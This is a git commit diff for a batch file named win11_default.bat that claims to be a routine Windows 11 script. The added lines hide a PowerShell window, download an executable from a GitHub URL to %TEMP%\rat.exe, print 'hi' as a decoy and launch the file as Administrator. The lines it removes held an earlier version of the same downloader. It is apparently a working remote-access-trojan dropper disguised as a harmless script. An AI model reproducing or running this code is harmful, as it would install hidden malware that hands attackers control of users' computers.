13ffff899a2671917c02c46df56ee92e7641920b
optolab <sloneeddie36@gmail.com>
2025-01-12 13:32:17 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,20 +1,12 @@
 @echo off
-setlocal enabledelayedexpansion
 
-:: Check if the script is running as admin
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    echo Admin privileges required
-    exit /b
-)
+:: Hide PowerShell execution window while downloading the file
+powershell -Command "Start-Process powershell -ArgumentList 'Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe' -WindowStyle Hidden" 
 
-:: Hide PowerShell command
-powershell -Command "[System.Net.WebRequest]::Create('https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe').GetResponse() | Out-Null"
+:: Display "hi" message
+echo hi
 
-:: Download the file
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe"
-
-:: Execute the downloaded file as administrator
+:: Run the downloaded file as administrator
 start /B "" runas /user:Administrator "%TEMP%\rat.exe"
 
 endlocal
